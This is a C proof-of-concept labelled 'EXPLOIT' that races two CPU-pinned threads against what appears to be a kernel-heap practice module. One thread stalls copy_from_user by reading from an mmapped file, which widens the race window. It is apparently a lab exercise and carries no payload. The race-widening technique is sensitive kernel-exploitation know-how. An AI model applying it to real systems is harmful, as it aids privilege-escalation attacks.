#define _GNU_SOURCE

#include <pthread.h>
#include <unistd.h>
#include "libs/pwn.h"


/*******************************
 * EXPLOIT                     *
 *******************************/

#define SLOW_FILE "/tmp/slow"
#define BUF_SIZE 8
#define SLOW_CPU 1
#define FAST_CPU 2

int race_done = 0;

void *fast(void *buf) {
  void *ptr;

  puts("[*] starting fast thread");
  pin_cpu(0, FAST_CPU);
  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  race_done = 2;

  keap_write(ptr, buf, BUF_SIZE);
  puts("[*] fast thread done");
  keap_free(ptr);

}

void *slow(void *buf) {
  void *ptr;

  printf("[*] starting slow thread\n");
  pin_cpu(0, SLOW_CPU);
  // slow down execute, increase race window

  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  race_done = 1;

  // stall copy_from_user using mmaped file
  keap_write(ptr, buf, BUF_SIZE);
  printf("[*] slow thread done\n");
  keap_free(ptr);

}


int main(int argc, char* argv[]) {
  int fd = -1;
  void *map;
  const char *buf = "\x06\xfe\x1b\xe2\0\0\0";
  pthread_t slow_t, fast_t, busy_t;

  setvbuf(stdout, NULL, _IONBF, 0);

  puts("[+] Initial setup");

  pin_cpu(0, 0);


  init();

  // create target file
  fd = SYSCHK(open(SLOW_FILE, O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));

  CHK(write(fd, buf, BUF_SIZE)==BUF_SIZE);
  SYSCHK(close(fd));

  fd = SYSCHK(open(SLOW_FILE, O_RDWR));
  map = SYSCHK(mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0));

  // create a busy thread to slow down execution
  pthread_create(&slow_t, NULL, slow, map);
  pthread_create(&fast_t, NULL, fast, (void*) buf);

  pthread_join(slow_t, NULL);
  pthread_join(fast_t, NULL);

  return race_done == 1 ? EXIT_SUCCESS : EXIT_FAILURE;  
}
